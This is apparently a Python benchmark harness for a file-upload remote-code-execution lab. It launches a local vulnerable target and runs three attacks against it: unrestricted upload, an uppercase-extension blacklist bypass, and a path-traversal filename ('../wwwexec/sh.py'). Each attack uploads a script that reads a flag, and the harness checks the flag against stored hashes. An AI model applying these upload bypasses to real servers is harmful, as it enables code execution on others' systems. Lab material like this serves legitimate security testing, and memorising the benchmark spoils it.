#!/usr/bin/env python3
"""文件上传 RCE 基准 · Python 侧独立双语言复刻（纯标准库）。

自实现 multipart 编码 / 上传三连（不受限 / 黑名单大小写绕过 / 路径穿越）/
落盘路径推导 / 执行结果取回，逐场景与 upload_benchmark.json 的 SHA-256 比对。
"""
import hashlib
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
BENCH = os.path.join(HERE, "upload_benchmark.json")
RANGE_PY = os.path.join(HERE, "live_target", "upload_range.py")

SHELL = 'import sys\nprint(open("flag.txt").read())\n'


def wait_ready(port, timeout=12.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            urllib.request.urlopen("http://127.0.0.1:%d/" % port, timeout=1)
            return True
        except Exception:
            time.sleep(0.1)
    return False


def multipart_body(name, content):
    b = "----" + uuid.uuid4().hex
    body = (
        '--%s\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n"
        % (b, name, content, b)
    ).encode()
    return body, b


def upload(port, path, name, content):
    body, b = multipart_body(name, content)
    req = urllib.request.Request(
        "http://127.0.0.1:%d%s" % (port, path), data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + b})
    try:
        resp = urllib.request.urlopen(req, timeout=8)
        return resp.read().decode(), True
    except urllib.error.HTTPError:
        return "", False


def get(port, path):
    try:
        return urllib.request.urlopen("http://127.0.0.1:%d%s" % (port, path),
                                      timeout=8).read().decode()
    except Exception:
        return ""


def saved_path(resp_text, fallback):
    for tok in resp_text.split():
        if tok not in ("as", "saved") and ("." in tok or "/" in tok):
            return tok.strip()
    return fallback


def fetch_candidates(saved, name):
    cands = []
    if saved and saved != name:
        base = saved
        while base.startswith("../"):
            base = base[3:]
        cands.append("/" + base if "/" in saved else "/uploads/" + saved)
    cands.append("/uploads/" + name)
    if name.endswith(".py"):
        cands.append("/uploads/" + name.replace(".py", ".PY", 1))
    return cands


def exploit(port):
    """上传三连攻击，返回 flag 候选列表。"""
    found = []
    seen = set()

    def try_fetch(saved, name):
        for fp in fetch_candidates(saved, name):
            out = get(port, fp)
            if out.startswith("flag{") and out not in seen:
                seen.add(out)
                found.append(out.strip())
                return True
        return False

    # 1) 不受限上传：直接 sh.py
    for name in ("sh.py", "sh.PY"):
        text, ok = upload(port, "/upload", name, SHELL)
        if ok and try_fetch(saved_path(text, name), name):
            return found
    # 2) 路径穿越：../wwwexec/sh.py（防重复——上面若已命中会提前返回）
    for name in ("../wwwexec/sh.py", "..%2fwwwexec%2fsh.py"):
        text, ok = upload(port, "/upload", name, SHELL)
        if ok and try_fetch(saved_path(text, name), name):
            return found
    return found


def main():
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]
    ports = {"upload_unrestricted": 18191, "upload_blacklist": 18192,
             "upload_traversal": 18193}
    hit = 0
    for scene, port in ports.items():
        env = dict(os.environ)
        p = subprocess.Popen([sys.executable, RANGE_PY, str(port), scene],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             env=env)
        try:
            if not wait_ready(port):
                print("%-20s ❌ 靶场未就绪" % scene)
                continue
            cands = exploit(port)
            ok = any(hashlib.sha256(c.encode()).hexdigest() == doc[scene]["flag_sha256"]
                     for c in cands)
            if ok:
                hit += 1
                print("%-20s ✅ SHA-256 校验通过（%d 候选）" % (scene, len(cands)))
            else:
                print("%-20s ❌ 未命中，got=%s" % (scene, cands[:2]))
        finally:
            p.kill()
    print("Python 侧文件上传 RCE：%d/3" % hit)
    return 0 if hit == 3 else 1


if __name__ == "__main__":
    sys.exit(main())
